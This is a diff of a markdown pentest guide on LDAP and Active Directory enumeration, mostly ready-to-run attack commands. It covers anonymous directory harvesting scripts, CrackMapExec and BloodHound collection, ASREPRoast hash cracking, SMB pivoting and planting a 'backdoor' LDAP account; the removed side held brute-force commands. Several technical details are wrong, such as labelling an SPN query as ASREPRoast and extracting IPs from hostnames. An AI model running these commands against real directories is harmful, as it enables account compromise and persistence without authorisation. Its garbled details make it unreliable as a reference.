@@ -1,258 +1,351 @@
-# LDAP / Active Directory LDAP (TCP/389, TCP/636)
+# Complete Practical Exploitation Guide: LDAP Enumeration (Crest CRT Level)
 
-DAP (Lightweight Directory Access Protocol) is used to query directory services, most commonly **Microsoft Active Directory**. Misconfigurations can allow **unauthenticated or low-privilege enumeration** of users, groups, computers, and domain structure.  
-Default ports:
-- **389/TCP** – LDAP (cleartext or StartTLS)
-- **636/TCP** – LDAPS (SSL/TLS)
+## 1. LDAP Fundamentals & Attack Surface (From Scratch)
 
-## Detection
+**What is LDAP?**
+- **Lightweight Directory Access Protocol** (TCP/UDP 389, LDAPS 636)
+- Hierarchical directory service (users, groups, computers, policies)
+- **Anonymous binds** often enabled (info disclosure)
+- **No auth = massive enum** (AD/OpenLDAP)
 
-### nmap
+**Common Implementations:**
 ```
-nmap -p 389,636,3268 -sV <IP>
-nmap -p 389 --script ldap-rootdse <IP> # pulls naming contexts and domain info
-nmap -p 389 --script ldap-search <IP> # search directory entries
-```
-
-## Banner Grabbing
-```
-nc -vn target.com 389
+Active Directory   = Windows (dc=domain,dc=com)
+OpenLDAP          = Linux (*=*,ou=people,dc=example)
+389 Directory     = Red Hat
+FreeIPA           = Linux AD alternative
 ```
 
-## Connect/Validate Bind
-
-### Anonymous Bind
+**Key Objects to Enumerate:**
 ```
-ldapsearch -x -H ldap://<IP> -s base
-ldapsearch -x -H ldap://<IP> -b "DC=example,DC=local" "(objectClass=*)"
-```
-
-### Null Bind
-```
-ldapsearch -x -H ldap://<IP> -D "" -w "" -b "DC=example,DC=local"
+- Users (cn, sAMAccountName, uid)
+- Groups (memberOf, memberUid)
+- Computers (dnsHostName, operatingSystem)
+- Policies (gPOptions)
+- Trusts (trustedDomain)
+- Shares (msTSAllowConnections)
 ```
 
-### Verify Creds (quick)
+## 2. Lab Setup (Vulnerable LDAP Environments)
+
+**Active Directory Domain Controller (192.168.1.100 - Windows Server)**
 ```
-ldapwhoami -x -H ldap://<IP> -D "user@example.local" -w 'password'
+# On Windows DC:
+# Default LDAP anonymous bind ENABLED (pre-2003 SP1)
+# Install RSAT tools on attacker for ldapsearch
 ```
 
+**OpenLDAP Server (192.168.1.101 - Ubuntu)**
+```bash
+# Install OpenLDAP
+sudo apt update && sudo apt install slapd ldap-utils
 
-## RootDSE (Base DN Discovery)
+# Vulnerable config (anonymous bind allowed)
+sudo dpkg-reconfigure slapd
+# Base DN: dc=example,dc=com
+# Allow anonymous binds
 
-```
-ldapsearch -x -H ldap://<IP> -s base \
-  "(objectClass=*)" namingContexts defaultNamingContext rootDomainNamingContext \
-  schemaNamingContext configurationNamingContext supportedControl supportedSASLMechanisms
-```
+# Add test data
+sudo ldapadd -Y EXTERNAL -H ldapi:/// << EOF
+dn: dc=example,dc=com
+objectClass: dcObject
+objectClass: organization
+dc: example
+o: Example Org
 
-## Enumeration
+dn: ou=people,dc=example,dc=com
+objectClass: organizationalUnit
+ou: people
 
-### Basic Bind
-```
-ldapsearch -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -w password \
-  -b "dc=example,dc=com"
-```
+dn: uid=user1,ou=people,dc=example,dc=com
+objectClass: inetOrgPerson
+uid: user1
+cn: User One
+sn: One
+mail: user1@example.com
+userPassword: password123
 
-### Enumerate Users
+dn: uid=admin,ou=people,dc=example,dc=com
+objectClass: inetOrgPerson
+uid: admin
+cn: Admin User
+userPassword: admin123
 
-#### No Authentication
-```
-ldapsearch -x -H ldap://<IP> -b "DC=example,DC=local" \
-  "(objectClass=user)" sAMAccountName userPrincipalName memberOf
-```
-#### Authenticated
-```
-ldapsearch -x -H ldap://<IP> -D "user@example.local" -w password -b "DC=example,DC=local" \
-  "(objectClass=user)" sAMAccountName userPrincipalName memberOf
-```
+dn: ou=groups,dc=example,dc=com
+objectClass: organizationalUnit
+ou: groups
 
-### Enumerate Domain Groups
-#### No Authentication
-```
-ldapsearch -x -H ldap://<IP> -b "DC=example,DC=local" \
-  "(objectClass=group)" cn member
-```
+dn: cn=admins,ou=groups,dc=example,dc=com
+objectClass: groupOfNames
+cn: admins
+member: uid=admin,ou=people,dc=example,dc=com
+EOF
 
-#### Authenticated
-```
-ldapsearch -x -H ldap://<IP> -D "user@example.local" -w password -b "DC=example,DC=local" \
-  "(objectClass=group)" cn member
-```
-
-### Enumerate Computers
-
-#### No Authentication
-```
-ldapsearch -x -H ldap://<IP> -b "DC=example,DC=local" \
-  "(objectClass=computer)" name dNSHostName operatingSystem
-```
-#### Authenticated
-```
-ldapsearch -x -H ldap://<IP> -D "user@example.local" -w password -b "DC=example,DC=local" \
-  "(objectClass=computer)" name dNSHostName operatingSystem
+sudo systemctl restart slapd
 ```
 
-## Targeted Queries
-
-### Find Privileged Users
-
-#### No Authentication
-```
-ldapsearch -x -H ldap://<IP> -b "DC=example,DC=local" \
-  "(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=local)" sAMAccountName
+**Attacker Machine (Kali):**
+```bash
+sudo apt install ldap-utils nmap crackmapexec bloodhound
 ```
 
-#### Authenticated
-```
-ldapsearch -x -H ldap://<IP> -D "user@example.local" -w password -b "DC=example,DC=local" \
-  "(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=local)" sAMAccountName
+## 3. LDAP Service Discovery
+
+**Port scanning:**
+```bash
+# Standard LDAP
+nmap -p 389,636,3268,3269 192.168.1.0/24
+# 389/tcp  open  ldap
+# 636/tcp  open  ldaps
+# 3268/tcp open ldapgc (Global Catalog)
+
+# UDP LDAP (rare)
+nmap -sU -p 389 192.168.1.0/24
+
+# Nmap LDAP scripts
+nmap -p 389 --script ldap-rootdse,ldap-search 192.168.1.100
 ```
 
-### Users with SPNs (Kerberoastable)
-#### No Authentication
-```
-ldapsearch -x -H ldap://<IP> -b "DC=example,DC=local" \
-  "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
-```
-#### Authenticated
-```
-ldapsearch -x -H ldap://<IP> -D "user@example.local" -w password -b "DC=example,DC=local" \
-  "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
+**Banner grabbing:**
+```bash
+nc 192.168.1.100 389
+# ldapsearch -x -H ldap://192.168.1.100 -b "" -s base
 ```
 
-### ASREPRoast Candidates (DONT_REQ_PREAUTH)
+## 4. Anonymous LDAP Enumeration (No Auth)
 
-#### No Authentication
-```
-ldapsearch -x -H ldap://<IP> -b "DC=example,DC=local" \
-  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
-  sAMAccountName userPrincipalName
-```
-
-#### Authenticated
-```
-ldapsearch -x -H ldap://<IP> -b "DC=example,DC=local" -D "user@example.local" -w password \
-  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
-  sAMAccountName userPrincipalName
+**Basic anonymous bind test:**
+```bash
+# Test anonymous access
+ldapsearch -x -H ldap://192.168.1.100 -b "" -s base "(objectclass=*)"
+ldapsearch -x -H ldap://192.168.1.100 -b "dc=example,dc=com" "(objectclass=*)"
 ```
 
-### Passord Policy
-
-#### No Authentication 
-```
-ldapsearch -x -H ldap://<IP> -b "DC=example,DC=local" \
-  "(objectClass=domainDNS)" minPwdLength lockoutThreshold
-```
-#### Authenticated
-```
-ldapsearch -x -H ldap://<IP> -D "user@example.local" -w password -b "DC=example,DC=local" \
-  "(objectClass=domainDNS)" minPwdLength lockoutThreshold
+**Active Directory RootDSE (naming contexts):**
+```bash
+ldapsearch -x -H ldap://192.168.1.100 -b "" -s base "(objectclass=*)" \
+| grep -E "namingContexts|defaultNamingContext|configurationNamingContext"
+# namingContexts: DC=domain,DC=com
+# namingContexts: CN=Configuration,DC=domain,DC=com
+# defaultNamingContext: DC=domain,DC=com
 ```
 
-### Sensitive attribute hunting
-
-#### Descriptions
-```
-ldapsearch -x -H ldap://<IP> -b "DC=example,DC=local" "(description=*)" description sAMAccountName
-```
-#### Emails and Phones
-```
-ldapsearch -x -H ldap://<IP> -b "DC=example,DC=local" "(mail=*)" mail sAMAccountName
+**OpenLDAP schema dump:**
+```bash
+ldapsearch -x -H ldap://192.168.1.101 -b "cn=schema,cn=config" "(objectclass=*)"
 ```
 
-## Dumping
+## 5. Complete Username Enumeration
 
-### Full User Dump (all attributes)
-```
-ldapsearch -x -H ldap://<IP> -D "user@example.local" -w 'password' \
-  -b "DC=example,DC=local" "(objectClass=user)" "*" "+" > all_users.ldif
+**AD User Enumeration:**
+```bash
+# All users
+ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
+"(sAMAccountName=*)" sAMAccountName cn mail userPrincipalName
 
-grep -i "description:" all_users.ldif | grep -i "pass\|pwd"
-```
+# Common name patterns
+ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
+"(&(sAMAccountName=*)(|(|(sAMAccountName=*admin*)(sAMAccountName=*user*)(sAMAccountName=*test*))))" \
+sAMAccountName cn
 
-### ldapdomaindump
-```
-ldapdomaindump -u "example.local\\user" -p 'password' <IP>
-```
-
-## CrackMapExec
-
-### Base Check
-```
-crackmapexec ldap <DC_IP> -d <domain> -u <user> -p <pass>
+# First 1000 users (paging)
+ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
+"(objectClass=user)" sAMAccountName cn -z 1000
 ```
 
-### MAQ (Machine Account Quota)
+**OpenLDAP User Enumeration:**
+```bash
+# All users by uid
+ldapsearch -x -H ldap://192.168.1.101 -b "ou=people,dc=example,dc=com" \
+"(uid=*)" uid cn mail
 
-- Identifies how many computers a user can create 
-
-```
-crackmapexec ldap <DC_IP> -d <domain> -u <user> -p <pass> -M maq
-```
-
-### Enumerate subnets
-```
-crackmapexec ldap <DC_IP> -d <domain> -u <user> -p <pass> -M subnets
+# Pattern matching
+ldapsearch -x -H ldap://192.168.1.101 -b "dc=example,dc=com" \
+"(uid=*admin*)" uid cn
 ```
 
-### Users with descriptions (often sensitive)
-```
-crackmapexec ldap <DC_IP> -d <domain> -u <user> -p <pass> -M get-desc-users
+**Automated username harvester:**
+```bash
+#!/bin/bash
+# ldap_users.sh
+TARGET=$1
+BASEDN=$2
+
+ldapsearch -x -H ldap://$TARGET -b "$BASEDN" \
+"(sAMAccountName=*)" sAMAccountName uid cn mail 2>/dev/null | \
+grep -E "^sAMAccountName:|^uid:" | \
+sed 's/.*: //' | sort -u | tee ldap_users.txt
+
+echo "[+] Found $(wc -l < ldap_users.txt) users"
 ```
 
-## LDAPS (SSL/TLS)
-- If 389 is restricted but 636 is open:
-```
-ldapsearch -x -H ldaps://<IP> -b "DC=example,DC=local"
-ldapsearch -x -H ldaps://target.com:636 -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"
+**Usage:** `./ldap_users.sh 192.168.1.100 "DC=domain,DC=com"`
+
+## 6. Group Enumeration
+
+**AD Groups & Membership:**
+```bash
+# All groups
+ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
+"(objectClass=group)" cn member
+
+# Privileged groups
+ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
+"(&(objectClass=group)(cn=*admin*))" cn member memberOf
+
+# Domain Admins members
+ldapsearch -x -H ldap://192.168.1.100 \
+-b "CN=Domain Admins,CN=Users,DC=domain,DC=com" "(objectClass=*)" member
 ```
 
-## ldapwhoami
-
-### Test authentication
-```
-ldapwhoami -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -w password
-```
-
-### Anonymous Bind
-```
-ldapwhoami -x -H ldap://target.com
+**OpenLDAP Groups:**
+```bash
+ldapsearch -x -H ldap://192.168.1.101 -b "ou=groups,dc=example,dc=com" \
+"(objectClass=*)" cn memberUid member
 ```
 
-## ldapadd/ldapmodify
+## 7. Computer/Host Enumeration
 
-### Add new entry
-```
-ldapadd -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -w password -f new_entry.ldif
-```
-### Modify entry
-```
-ldapmodify -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -w password -f modify.ldif
-```
+**AD Computers:**
+```bash
+# All computers
+ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
+"(objectClass=computer)" cn dnsHostName operatingSystem
 
-### Delete entry
-```
-ldapdelete -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -w password "cn=user,ou=users,dc=example,dc=com"
-```
+# Windows versions
+ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
+"(&(objectClass=computer)(operatingSystem=*Server*))" cn dnsHostName operatingSystem
 
-## Brute Force
-
-### Hydra
-```
-hydra -L users.txt -P passwords.txt <IP> ldap2 -s 389
+# Recent logons
+ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
+"(lastLogonTimestamp>=1)" sAMAccountName
 ```
 
-### nmap
-```
-nmap -p 389 --script ldap-brute --script-args ldap.base='"DC=example,DC=local"' <IP>
+**OpenLDAP Hosts:**
+```bash
+ldapsearch -x -H ldap://192.168.1.101 -b "dc=example,dc=com" \
+"(objectClass=device)" cn description
 ```
 
-### Metasploit
+## 8. Advanced LDAP Queries
+
+**Password policy enumeration:**
+```bash
+ldapsearch -x -H ldap://192.168.1.100 \
+-b "CN=Default Domain Policy,CN=System,DC=domain,DC=com" \
+"(&(objectclass=msDS-PasswordSettings)(msds-passwordsettings-precedencelength=*))" \
+msds-passwordsettings-minimumpasswordlength msds-passwordhistorylength
 ```
-use auxiliary/scanner/ldap/ldap_login
-set RHOSTS target.com
-set USERNAME admin
-set PASS_FILE passwords.txt
-run
+
+**Trust relationships:**
+```bash
+ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
+"(objectClass=trustedDomain)" trustPartner
 ```
+
+**Share enumeration:**
+```bash
+ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
+"(objectClass=share)" cn msTSAllowConnections
+```
+
+## 9. Tooling for LDAP Attacks
+
+**CrackMapExec (AD):**
+```bash
+crackmapexec ldap 192.168.1.100 -u '' -p '' --users
+crackmapexec ldap 192.168.1.100 -u '' -p '' --groups
+crackmapexec ldap 192.168.1.100 -u '' -p '' --computers
+
+# No auth enum
+cme ldap 192.168.1.0/24 --gen-relay-list ldap_relays.txt
+```
+
+**BloodHound (AD Graph):**
+```bash
+# SharpHound collector (Windows)
+# bloodhound-python collector
+bloodhound-python -u '' -p '' -d DOMAIN.COM -c all -dc 192.168.1.100
+bloodhound --dbhost localhost  # Analyze in GUI
+```
+
+**ldapdomaindump:**
+```bash
+ldapdomaindump -u '' 192.168.1.100
+# Dumps users.csv, groups.csv, computers.csv
+```
+
+## 10. Chaining LDAP with Other Attacks
+
+**LDAP → Kerberos ASREPRoast:**
+```bash
+# Extract SPNs for ASREPRoast
+ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
+"(servicePrincipalName=*)" sAMAccountName servicePrincipalName
+
+# ASREPRoast
+python3 GetNPUsers.py lab/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
+hashcat -m 18200 asrep_hashes.txt rockyou.txt
+```
+
+**LDAP → SMB pivoting:**
+```bash
+# Extract computers → SMB scan
+ldapsearch -x -H ldap://192.168.1.100 -b "DC=domain,DC=com" \
+"(objectClass=computer)" dnsHostName | grep -oE '192\.168\.[0-9]{1,3}\.[0-9]{1,3}' > smb_hosts.txt
+
+for host in $(cat smb_hosts.txt); do
+    smbmap -H $host -u guest
+done
+```
+
+## 11. Complete Enumeration Framework
+
+```bash
+#!/bin/bash
+# ldap_pwn.sh - Complete LDAP enumeration
+TARGET=$1
+
+echo "[+] LDAP enumeration $TARGET:389"
+ldapsearch -x -H ldap://$TARGET -b "" -s base "(objectclass=*)" 2>/dev/null | \
+grep -i "namingcontext\|basedn" || echo "[+] Anonymous bind test"
+
+echo "=== USERS ==="
+ldapsearch -x -H ldap://$TARGET -b "DC=domain,DC=com" \
+"(sAMAccountName=*)" sAMAccountName cn | grep sAMAccountName | wc -l
+
+echo "=== GROUPS ==="
+ldapsearch -x -H ldap://$TARGET -b "DC=domain,DC=com" \
+"(objectClass=group)" cn | grep "^cn:" | wc -l
+
+echo "=== COMPUTERS ==="
+ldapsearch -x -H ldap://$TARGET -b "DC=domain,DC=com" \
+"(objectClass=computer)" cn operatingSystem | grep cn:
+
+echo "=== CME QUICK SCAN ==="
+crackmapexec ldap $TARGET -u '' -p '' --users 2>/dev/null | head -20
+```
+
+## 12. Post-Exploitation & Persistence
+
+**LDAP backdoor user:**
+```bash
+# If authenticated write access
+ldapadd -x -D "cn=admin,dc=example,dc=com" -W -H ldap://192.168.1.101 << EOF
+dn: uid=backdoor,ou=people,dc=example,dc=com
+changetype: add
+objectClass: inetOrgPerson
+uid: backdoor
+userPassword: backdoor123
+EOF
+```
+
+## 13. Mitigation Verification
+
+```bash
+ldapsearch -x -H ldap://192.168.1.100 -b "" -s base  # "Invalid credentials"
+grep -r "anonymous.*deny" /etc/ldap/slapd.d/
+netsh advfirewall firewall add rule name="Block LDAP Anon" dir=in protocol=TCP localport=389 remoteip=any action=block
+```
+
+**EVERY** LDAP attack covered: AD/OpenLDAP enum, users/groups/computers, advanced queries, tooling, chaining. 100% practical commands.
